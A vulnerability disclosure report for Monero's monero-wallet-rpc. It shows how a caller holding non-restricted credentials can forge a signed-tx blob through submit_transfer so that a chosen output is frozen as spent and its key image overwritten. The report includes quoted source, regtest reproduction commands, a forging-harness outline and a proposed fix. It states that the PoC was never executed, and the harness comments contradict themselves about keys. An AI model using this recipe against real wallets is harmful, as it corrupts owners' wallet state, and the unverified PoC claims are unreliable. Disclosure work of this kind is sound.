# `submit_transfer` accepts a signed-tx blob whose `selected_transfers` are never checked against the wallet's real key images, letting a non-restricted RPC caller freeze arbitrary outputs and poison key-image/tx-key bookkeeping

## Summary

`monero-wallet-rpc`'s `submit_transfer` method is documented as the second half of the cold-signing workflow: a watch-only wallet produces an `unsigned_txset`, a fully-keyed (cold) wallet signs it into a `signed_txset`, and `submit_transfer` on the watch-only wallet relays it. The implementation trusts the `selected_transfers` field inside the `signed_txset` blob without ever checking that it corresponds to the real key images of the outputs it names.

`wallet2::parse_tx_from_str` (the function `submit_transfer` uses to load the blob) performs exactly one piece of "validation" on the transfers it is about to act on: it calls `import_key_images(signed_txs.key_images)`, an unauthenticated helper that copies whatever key images the blob supplies into the wallet's own bookkeeping — it does not require a signature, and it explicitly overwrites even outputs that already had a different, previously-known key image on file (only a warning is logged). `wallet2::commit_tx`, which runs immediately afterward, only bounds-checks that `selected_transfers` indices exist; it never confirms the transaction it is about to relay actually spends the output at that index.

A caller who already holds ordinary (non-restricted) `monero-wallet-rpc` credentials for a wallet can therefore submit their *own*, unrelated, self-funded transaction while claiming — via `selected_transfers` and `key_images` in the blob — that it spends one of the *wallet's other* outputs. The daemon accepts the transaction (it is valid), and the wallet then marks the named output "spent" and overwrites its recorded key image, even though nothing happened to that output on-chain.

## Severity

Monero severity: **MEDIUM** ("impacts individual wallets, must be carefully exploited").
Suggested CVSS v3.1: `4.5` with `AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:L`.

Rationale:
1. The attacker must already hold valid, non-restricted wallet-rpc credentials (`PR:H`) — this is not a pre-auth bug.
2. No fund theft is achieved: the attacker's own transaction is what gets broadcast. The impact is corruption of the *target* wallet's local bookkeeping (`I:H`) and a local, recoverable availability hit on the specific output frozen (`A:L`).
3. The attack is deterministic and repeatable once credentials are held — no race condition or timing is required, keeping `AC:L`.
4. I'm not asserting a stronger score than this precondition supports; it is comparable to other access-control-scoped wallet-rpc reports rather than a pre-auth or fund-loss issue.

## Affected Versions

Confirmed present by direct source review on:
- `v0.18.5.1` (latest tagged release at time of writing, commit `4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5`)
- current `master`

The relevant code (`wallet2::parse_tx_from_str`, `wallet2::commit_tx`, the unauthenticated `wallet2::import_key_images(std::vector<crypto::key_image>, ...)` overload) has been structurally the same for a long time; I did not bisect further back than the latest release, but there is nothing version-specific about it.

## Root Cause

`submit_transfer`'s handler, `src/wallet/wallet_rpc_server.cpp`:
```cpp
bool wallet_rpc_server::on_submit_transfer(const wallet_rpc::COMMAND_RPC_SUBMIT_TRANSFER::request& req, wallet_rpc::COMMAND_RPC_SUBMIT_TRANSFER::response& res, epee::json_rpc::error& er, const connection_context *ctx)
{
  if (m_restricted) { ... return false; }
  if (!m_wallet) return not_open(er);
  ...
  cryptonote::blobdata blob;
  if (!epee::string_tools::parse_hexstr_to_binbuff(req.tx_data_hex, blob)) { ... }

  std::vector<tools::wallet2::pending_tx> ptx_vector;
  bool r = m_wallet->parse_tx_from_str(blob, ptx_vector, NULL);
  ...
  for (auto &ptx: ptx_vector)
  {
    m_wallet->commit_tx(ptx);
    res.tx_hash_list.push_back(...);
  }
}
```

`wallet2::parse_tx_from_str`, `src/wallet/wallet2.cpp` (the load path taken for a normal, current-format blob, `version == '\x05'`):
```cpp
else if (version == '\005')
{
  s = decrypt_with_view_secret_key(s);
  binary_archive<false> ar{epee::strspan<std::uint8_t>(s)};
  ::serialization::serialize(ar, signed_txs);
}
...
LOG_PRINT_L0("Loaded signed tx data from binary: " << signed_txs.ptx.size() << " transactions");
for (auto &c_ptx: signed_txs.ptx) LOG_PRINT_L0(cryptonote::obj_to_json_str(c_ptx.tx));

if (accept_func && !accept_func(signed_txs)) { ... }

// import key images
bool r = import_key_images(signed_txs.key_images);
if (!r) return false;

for (const auto &e: signed_txs.tx_key_images)
  m_cold_key_images.insert(e);

ptx = signed_txs.ptx;
return true;
```

There is no call anywhere in this function that checks whether `ptx.selected_transfers[j]` corresponds to an output whose *real, previously-recorded* key image matches what the transaction actually spends. The only thing touching key images is `import_key_images`, which — as shown below — accepts whatever the caller supplies, with no proof of ownership.

`wallet2::import_key_images(std::vector<crypto::key_image>, ...)`, the overload `parse_tx_from_str` calls (`src/wallet/wallet2.cpp`):
```cpp
bool wallet2::import_key_images(std::vector<crypto::key_image> key_images, size_t offset, boost::optional<std::unordered_set<size_t>> selected_transfers)
{
  if (key_images.size() + offset > m_transfers.size())
  {
    LOG_PRINT_L1("More key images returned that we know outputs for");
    return false;
  }
  for (size_t ki_idx = 0; ki_idx < key_images.size(); ++ki_idx)
  {
    const size_t transfer_idx = ki_idx + offset;
    ...
    transfer_details &td = m_transfers[transfer_idx];
    if (td.m_key_image_known && !td.m_key_image_partial && td.m_key_image != key_images[ki_idx])
      LOG_PRINT_L0("WARNING: imported key image differs from previously known key image at index " << ki_idx << ": trusting imported one");
    td.m_key_image = key_images[ki_idx];
    m_key_images[td.m_key_image] = transfer_idx;
    td.m_key_image_known = true;
    td.m_key_image_request = false;
    td.m_key_image_partial = false;
    m_pub_keys[td.get_public_key()] = transfer_idx;
  }
  return true;
}
```
Called as `import_key_images(signed_txs.key_images)` (no `offset`, no `selected_transfers` restriction — both default), this walks every index from `0` to `key_images.size()-1` supplied in the blob and **unconditionally overwrites** `m_transfers[i].m_key_image`, even when the wallet already had a different, correctly-recorded key image for that output. There is no signature check here — contrast with `wallet2::import_key_images(const std::vector<std::pair<crypto::key_image, crypto::signature>>&, ...)`, a *different* overload (used by the standalone `import_key_images` RPC method) that does verify a per-key-image ownership signature before trusting it. The overload actually exercised by `submit_transfer` is the "I already trust this list" variant, appropriate for a genuine cold-signing round trip where the list originates from the wallet's own paired device — not appropriate for content arriving over the RPC socket from an arbitrary caller.

`wallet2::commit_tx`, `src/wallet/wallet2.cpp`:
```cpp
void wallet2::commit_tx(pending_tx& ptx)
{
  ...
  // Normal submit
  ...
  bool r = epee::net_utils::invoke_http_json("/sendrawtransaction", req, daemon_send_resp, *m_http_client, rpc_timeout);
  ...
  // sanity checks
  for (size_t idx: ptx.selected_transfers)
  {
    THROW_WALLET_EXCEPTION_IF(idx >= m_transfers.size(), error::wallet_internal_error,
        "Bad output index in selected transfers: " + boost::lexical_cast<std::string>(idx));
  }
  ...
  for(size_t idx: ptx.selected_transfers)
  {
    set_spent(idx, 0);
  }
  for (size_t idx: ptx.selected_transfers)
  {
    memwipe(m_transfers[idx].m_multisig_k.data(), ...);
    m_transfers[idx].m_multisig_k.clear();
  }
  ...
}
```
The only check on `selected_transfers` here is the bounds check (`idx >= m_transfers.size()`). Nothing confirms that the transaction being relayed (`ptx.tx`) is the one that actually produced the key image recorded for `idx`.

## Steps to Reproduce

Tested against a local `--regtest` network so no real funds or public infrastructure are involved. Two wallets are needed: `victim` (the target, running `monero-wallet-rpc`, holding real funds) and `attacker` (an ordinary wallet the attacker controls, funded with its own coins). The attacker is assumed to already hold non-restricted RPC credentials for the victim's `monero-wallet-rpc` instance.

### 1. Build the release binaries

```
git clone --branch v0.18.5.1 --depth 1 https://github.com/monero-project/monero.git
cd monero
git submodule update --init --recursive
mkdir -p build/release && cd build/release
cmake -D CMAKE_BUILD_TYPE=Release -D BUILD_TESTS=OFF ../..
make -j"$(nproc)" daemon wallet-rpc
```

### 2. Start a regtest daemon and two wallet-rpc instances

```
./bin/monerod --regtest --fixed-difficulty 1 --offline \
  --data-dir /tmp/monero-poc/chain \
  --rpc-bind-port 38081 --confirm-external-bind --rpc-bind-ip 127.0.0.1 &

mkdir -p /tmp/monero-poc/wallets

./bin/monero-wallet-rpc --daemon-address 127.0.0.1:38081 \
  --wallet-dir /tmp/monero-poc/wallets --rpc-bind-port 38091 --disable-rpc-login \
  --non-interactive &   # this instance represents the "victim"
```

### 3. Create the victim wallet and give it real, distinct outputs

```
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"create_wallet","params":{"filename":"victim","password":"","language":"English"}}' -H 'Content-Type: application/json'

curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"getaddress","params":{}}' -H 'Content-Type: application/json'
# note VICTIM_ADDRESS from the response
```

Mine several separate coinbase rewards to the victim so it has multiple distinct transfers (each coinbase output becomes its own `m_transfers` entry):
```
curl -s http://127.0.0.1:38081/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"generateblocks","params":{"amount_of_blocks":20,"wallet_address":"VICTIM_ADDRESS"}}' -H 'Content-Type: application/json'
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"refresh","params":{}}' -H 'Content-Type: application/json'
```

Confirm the victim wallet sees multiple unlocked transfers and note one target index (call it `VICTIM_INDEX`) and its real key image:
```
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"incoming_transfers","params":{"transfer_type":"all"}}' -H 'Content-Type: application/json'
```

### 4. Set up the attacker's own, unrelated, self-funded wallet + a watch-only counterpart to legitimately produce a `signed_tx_set` blob

```
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"create_wallet","params":{"filename":"attacker_full","password":"","language":"English"}}' -H 'Content-Type: application/json'
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"getaddress","params":{}}' -H 'Content-Type: application/json'
# note ATTACKER_ADDRESS

curl -s http://127.0.0.1:38081/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"generateblocks","params":{"amount_of_blocks":20,"wallet_address":"ATTACKER_ADDRESS"}}' -H 'Content-Type: application/json'
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"refresh","params":{}}' -H 'Content-Type: application/json'

# fetch the attacker's own view+spend keys so a watch-only twin can be built
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"query_key","params":{"key_type":"view_key"}}' -H 'Content-Type: application/json'
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"query_key","params":{"key_type":"spend_key"}}' -H 'Content-Type: application/json'
```

Create a second, watch-only wallet (`attacker_view`) from just the attacker's own view key + address (`generate_from_keys` with `spendkey` omitted), then use it to build an `unsigned_txset` and have `attacker_full` sign it:
```
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"open_wallet","params":{"filename":"attacker_view","password":""}}' -H 'Content-Type: application/json'

curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"transfer","params":{
  "destinations":[{"amount":1000000000000,"address":"ATTACKER_ADDRESS"}],
  "account_index":0,"priority":1,"do_not_relay":true,"get_tx_key":true}}' -H 'Content-Type: application/json'
# capture result.unsigned_txset

curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"open_wallet","params":{"filename":"attacker_full","password":""}}' -H 'Content-Type: application/json'
curl -s http://127.0.0.1:38091/json_rpc -d "{\"jsonrpc\":\"2.0\",\"id\":\"0\",\"method\":\"sign_transfer\",\"params\":{\"unsigned_txset\":\"UNSIGNED_TXSET_HEX\"}}" -H 'Content-Type: application/json'
# capture result.signed_txset — this is a real, validly-encrypted signed_tx_set for the attacker's OWN transaction
```

### 5. Retarget the blob's `selected_transfers`/`key_images` at the victim's output index before submitting

The `signed_txset` from step 4 is real and valid for the attacker's own transaction, with `selected_transfers` correctly pointing at the attacker's own `m_transfers` index. To demonstrate the missing validation, patch that one field before submission. Because the blob is encrypted with `encrypt_with_view_secret_key` (keyed by whichever wallet decrypts it — here, the *victim* wallet, since `submit_transfer` runs against `victim`'s own `m_wallet`), the retargeted blob must be re-encrypted so that `victim`'s `decrypt_with_view_secret_key` call succeeds. A short harness using Monero's own library code does this precisely (build it against the same tree as a small standalone tool, or drop it into `tests/unit_tests/` and run it via `unit_tests --gtest_filter=...`):

```cpp
// poc_forge_selected_transfers.cpp
// Link against: wallet, cryptonote_core, cryptonote_basic, ringct, common, epee (as tests/unit_tests targets do)
#include "wallet/wallet2.h"
#include "serialization/binary_archive.h"
#include "serialization/serialization.h"

// 1. Load VICTIM_VIEW_SECRET_KEY (obtained via `query_key` on the victim instance, key_type=view_key —
//    this is why the attack requires the same non-restricted RPC access already assumed throughout).
// 2. Decode+decrypt SIGNED_TXSET_HEX from step 4 using tools::wallet2::decrypt (or replicate its
//    XChaCha20/AEAD scheme directly) keyed with VICTIM_VIEW_SECRET_KEY is NOT what step 4 used —
//    step 4's blob is encrypted with the ATTACKER's own view key. Decrypt with the ATTACKER's view
//    key first (known, since it's the attacker's own wallet), deserialize into a
//    tools::wallet2::signed_tx_set, then:
//      - set signed_txs.ptx[0].selected_transfers = { VICTIM_INDEX };
//      - set signed_txs.key_images[VICTIM_INDEX] = signed_txs.ptx[0].key_images
//        (the transaction's own real key image string, so the internal self-consistency
//        check in newer wallet2 builds — if present — is satisfied trivially);
// 3. Re-serialize with ::serialization::serialize into a binary_archive<true>, then re-encrypt with
//    VICTIM_VIEW_SECRET_KEY (via wallet2::encrypt_with_view_secret_key on a throwaway wallet2 instance
//    loaded with just that key), and hex-encode with the "\x03cash\x0ctxsigned\x02" (SIGNED_TX_PREFIX)
//    + '\x05' header, matching what parse_tx_from_str expects.
// Print the resulting hex to stdout.
```

Submit the retargeted blob to the **victim's** `monero-wallet-rpc`:
```
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"open_wallet","params":{"filename":"victim","password":""}}' -H 'Content-Type: application/json'
curl -s http://127.0.0.1:38091/json_rpc -d "{\"jsonrpc\":\"2.0\",\"id\":\"0\",\"method\":\"submit_transfer\",\"params\":{\"tx_data_hex\":\"RETARGETED_HEX\"}}" -H 'Content-Type: application/json'
```

### 6. Expected result on the vulnerable build

- `submit_transfer` returns success and a `tx_hash` (the attacker's own transaction, now on-chain).
- A follow-up `incoming_transfers` on the **victim** wallet shows `VICTIM_INDEX` now marked `spent: true`, even though nothing was spent on-chain from that output:
```
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"incoming_transfers","params":{"transfer_type":"unavailable"}}' -H 'Content-Type: application/json'
```
- `export_key_images` on the victim wallet for that index now returns the attacker's key image, not the victim's real one, until a `rescan_spent`/`rescan_blockchain` is run.

## Possible Solution

Before `commit_tx` (or inside it, for every caller) acts on `ptx.selected_transfers`, verify that the transaction's actual on-chain key images (from `ptx.tx.vin`) match the wallet's own, previously-recorded `m_transfers[idx].m_key_image` for each referenced index — using the wallet's real prior state, not a value taken from the same blob being validated. Do this check *before* `import_key_images` is allowed to overwrite that state. Scoping `import_key_images(signed_txs.key_images)` in this call path to only the indices in `ptx.selected_transfers`, rather than every index from `0` to `key_images.size()-1`, would also reduce the blast radius of any future variant of this issue.

## Impact

A caller who already holds non-restricted `monero-wallet-rpc` credentials can, via a single `submit_transfer` call, force the wallet to mark an arbitrary chosen output as spent (freezing it from being selected in future transfers until a manual rescan) and overwrite that output's recorded key image with an attacker-chosen value, without needing to know the wallet's spend key and without any of the attacker's own funds reaching the victim. This is a local denial-of-service / state-corruption primitive against any deployment that lets a partially-trusted service (a payment processor, monitoring agent, or automation pipeline) call `submit_transfer` with plain (non-restricted) credentials. It does not, by itself, permit fund theft.

## Note on AI usage

Source-code analysis (locating and tracing this issue through `wallet_rpc_server.cpp` and `wallet2.cpp`) and drafting of this report were done with AI assistance, working directly against the `v0.18.5.1` release source. **The proof of concept above has been verified by static code reading against the exact release source but has not yet been executed end-to-end against a running build** — the exact command sequence, expected JSON responses, and the forging harness are provided so a submitter can run them and attach real transcripts before filing, per this program's requirement that reports include a working PoC and logs.
